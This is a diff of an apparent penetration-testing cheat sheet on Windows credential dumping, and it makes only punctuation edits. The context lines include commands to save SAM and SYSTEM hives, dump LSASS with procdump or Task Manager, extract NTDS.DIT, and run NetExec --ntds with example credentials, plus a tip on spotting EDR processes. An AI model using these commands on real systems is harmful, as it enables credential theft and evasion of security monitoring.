@@ -4,7 +4,7 @@
     If LSASS is protected (PPL enabled), dump SAM/SYSTEM offline: `reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM system.bak` then run `impacket-secretsdump` locally. No process injection required.
 
 !!! warning "Watch out"
-    LSASS dumps trigger EDR on most enterprise endpoints. Check for AV/EDR first with `tasklist` — look for CrowdStrike, SentinelOne, Defender, Carbon Black processes before touching LSASS.
+    LSASS dumps trigger EDR on most enterprise endpoints. Check for AV/EDR first with `tasklist`. Look for CrowdStrike, SentinelOne, Defender, Carbon Black processes before touching LSASS.
 
 ---
 
@@ -63,13 +63,13 @@ procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
 Then parse with Mimikatz or pypykatz.
 
-### Task Manager (GUI — when you have RDP)
+### Task Manager (GUI, when you have RDP)
 
 Open Task Manager → Details tab → right-click `lsass.exe` → Create Dump File. Transfer `.dmp` to attacker machine and parse offline.
 
 ---
 
-## Dump NTDS.DIT (Domain Controller — All Hashes)
+## Dump NTDS.DIT (Domain Controller, All Hashes)
 
 ### Via Shadow Copy (Preferred)
 
@@ -86,7 +86,7 @@ Transfer and extract:
 impacket-secretsdump -ntds ntds.dit -system system LOCAL
 ```
 
-### Via NetExec (Remote — if you have DA creds)
+### Via NetExec (Remote, if you have DA creds)
 
 ```bash
 nxc smb 10.10.10.10 -u Administrator -p 'Password1' --ntds
